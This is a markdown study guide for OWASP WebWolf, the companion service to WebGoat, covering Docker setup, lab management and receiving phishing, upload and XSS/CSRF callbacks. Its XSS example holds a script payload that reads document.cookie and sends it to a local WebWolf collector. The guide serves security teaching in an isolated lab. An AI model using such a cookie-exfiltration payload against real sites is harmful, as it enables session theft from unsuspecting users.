# WebWolf – Full Practical Documentation & Learning Guide

**File:** `tools/webwolf.md`  
**Purpose:** To teach ethical cybersecurity students how to use, understand, and manage OWASP WebWolf in a structured, repeatable, and fully offline learning environment.

---

## 🧠 What is WebWolf?

WebWolf is a **simulated service environment** developed by OWASP. It is designed to **work alongside WebGoat**, the vulnerable web application used to teach security concepts.

Where WebGoat lets you exploit vulnerabilities, **WebWolf acts as the target** — it receives phishing clicks, file uploads, emails, and malicious callbacks. This combination lets you practice **both the attack and the impact** in one lab.

WebWolf allows you to simulate:
- 📧 Email phishing and view mailboxes
- 📤 Upload files (e.g., malware simulations)
- 🔗 Receive XSS/CSRF callbacks
- 🧾 Monitor HTTP requests from victims
- 💬 Practice real post-exploitation tasks

---

## ⚙️ System Requirements

- OS: Kali Linux or any Linux distro
- Tools:
  - Docker (must be installed and running)
  - Firefox (or any browser)
  - WebGoat (installed together with WebWolf)

---

## 🚀 How to Install WebWolf (Via Docker)

WebWolf is packaged together with WebGoat. One Docker command runs both:

### Step 1: Install Docker (if not installed)

```bash
sudo apt update
sudo apt install docker.io -y
sudo systemctl enable docker
sudo systemctl start docker
```

### Step 2: Pull and Run the Container

```bash
sudo docker run -d -p 8082:8080 -p 9092:9090 --name webgoat webgoat/webgoat
```

This exposes:
- WebGoat at `http://localhost:8082/WebGoat`
- WebWolf at `http://localhost:9092/WebWolf`

⚠️ Don’t use the default ports (8080 and 9090) directly on host — they may be in use.

---

## 🔓 Accessing WebWolf

Open your browser and go to:

```
http://localhost:9092/WebWolf
```

You will see a simple interface with sections like:
- Email Inbox
- File Upload
- HTTP Request Receiver
- Log Viewer
- Payload Handlers

This interface works **only during lessons that require it**. WebWolf is passive unless triggered by WebGoat modules.

---

## 📚 What WebWolf Teaches You

| Feature            | Lesson Type in WebGoat                    |
|--------------------|-------------------------------------------|
| Email Inbox        | Phishing Simulation, HTML Injection       |
| File Upload        | File Upload Vulnerabilities               |
| XSS Callback       | XSS with external requests                |
| CSRF Simulation    | CSRF form POST/GET handling               |
| HTTP Logging       | Malicious payload delivery logs           |

---

## 🧪 Example: How WebWolf is Used

### Scenario: XSS Callback

1. In WebGoat, complete an XSS challenge.
2. Use a payload like:
   ```html
   <script>fetch("http://localhost:9092/WebWolf/log?cookie="+document.cookie)</script>
   ```
3. When the script runs, it sends the browser’s cookie to WebWolf.
4. Go to `http://localhost:9092/WebWolf/log` to view it.

This simulates **data exfiltration**, and you can analyze what a real attacker would see.

---

## 🔁 Start/Stop WebWolf Without Losing Progress

Since WebWolf runs inside the `webgoat` container, you manage it through Docker:

### Stop (pause but don’t delete):

```bash
sudo docker stop webgoat
```

### Resume (turn back on):

```bash
sudo docker start webgoat
```

✅ Your login, user data, and lesson progress will remain saved.

---

## 🧼 Permanently Delete WebWolf

To remove all data, user accounts, and logs:

```bash
sudo docker stop webgoat
sudo docker rm webgoat
sudo docker rmi webgoat/webgoat
```

This deletes both WebGoat and WebWolf.

> To back up your progress before deletion:
```bash
sudo docker commit webgoat webgoat-backup
```

---

## 🧠 Best Practices for Cybersecurity Learners

- Do not expose WebWolf to the internet — it’s insecure by design.
- Use only on localhost (127.0.0.1) or within an isolated VM or VPN.
- Never send real credentials to WebWolf or WebGoat.
- Do not test your payloads against anything except lab environments.

---

## 📋 WebWolf for Task-Based Learning

Use WebWolf in combination with:
- **OWASP ZAP:** Intercept XSS/CSRF calls to WebWolf endpoints.
- **Burp Suite:** Manipulate POST requests targeting WebWolf.
- **Browser DevTools:** Watch form actions and simulate phishing.

Create custom tasks like:
- Capture file uploads with fake extensions
- Test unsafe redirects with WebWolf logs
- Automate phishing form interactions

---

## 🔎 Interacting With WebWolf Manually

You can manually send a GET/POST request to WebWolf using curl:

```bash
curl http://localhost:9092/WebWolf/log?message=hello_world
```

View logs at:

```
http://localhost:9092/WebWolf/log
```

Use this to simulate:
- XSS exfiltration
- Payload delivery
- Tracking victim clicks

---

## 🧾 Screenshots and Reporting Tips

To capture useful screenshots for learning/reports:

1. Open WebWolf inbox or logs
2. Run payload in WebGoat that sends a callback
3. Refresh WebWolf view
4. Take screenshot showing response/message/callback
5. Name files clearly:
   - `webwolf_xss_callback.png`
   - `webwolf_file_upload_success.png`

---

## 🛡️ WebWolf vs Other Tools

| Feature         | WebWolf             | Burp Collaborator | RequestBin      |
|-----------------|---------------------|-------------------|-----------------|
| Phishing Inbox  | ✅ Yes               | ❌ No              | ❌ No            |
| File Upload     | ✅ Yes               | ❌ No              | ❌ No            |
| XSS Receiver    | ✅ Yes               | ✅ Yes             | ✅ Yes           |
| Self-hosted     | ✅ Offline           | ❌ Cloud required  | ❌ Cloud required|
| OWASP Integrated| ✅ Works with WebGoat| ❌                 | ❌               |

---

## 📂 Directory Structure (Docker Internal)

- `/home/webgoat/webwolf`: Main WebWolf folder inside the container
- `/upload`: Temporarily holds uploaded files
- `/log`: Stores received logs from XSS/CSRF

Access these only through container CLI or WebWolf UI.

---

## 📚 Further Learning

- [WebGoat GitHub](https://github.com/WebGoat/WebGoat)
- [WebWolf GitHub](https://github.com/WebGoat/WebWolf)
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [Docker Reference](https://docs.docker.com/engine/reference/run/)

---

## ✅ Summary

WebWolf is more than a companion — it’s a **lab simulator** for real post-exploitation behavior in web security training. Use it to:
- Complete phishing and email-based challenges
- Observe how file upload vulnerabilities work
- Understand XSS and CSRF beyond browser alerts
- Track malicious payloads as they arrive

When paired with WebGoat, it creates a full-stack offensive security lab environment — one that every ethical hacker, student, or penetration tester should experience firsthand.

---

## 🧾 Author Notes

This file was created as part of the **CyberBible** internal documentation by **Abin Shaji Thomas** to support private training, internship reporting, and personal lab development.

Please use WebWolf **ethically**, responsibly, and always in private lab environments.

